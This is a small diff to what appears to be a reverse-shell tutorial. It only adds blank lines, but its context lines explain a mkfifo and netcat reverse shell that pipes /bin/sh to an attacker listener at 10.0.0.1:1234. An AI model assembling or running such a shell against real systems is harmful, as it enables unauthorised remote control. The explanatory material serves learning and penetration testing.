@@ -38,7 +38,9 @@ Here's a breakdown of the command sequence:
 * `mkfifo /tmp/f;`: Creates a named pipe `/tmp/f`. Named pipes allow for temporary file-like communication between processes.
 * `cat /tmp/f | /bin/sh -i 2>&1`: This part sets up a reverse shell. It reads from the named pipe, executes commands using the shell (`/bin/sh -i`), and redirects both stdout and stderr to the pipe.
 * `nc 10.0.0.1 1234 > /tmp/f`: This uses `netcat` (nc) to connect back to the attacker's machine listening on IP `10.0.0.1` and port `1234`. Output from the shell (connected via `nc`) is redirected back into `/tmp/f`, thus maintaining a continuous shell session.
+
 <br>
+
 #### Step 3: Set Up a Listener on the Attacking Machine  
 
 
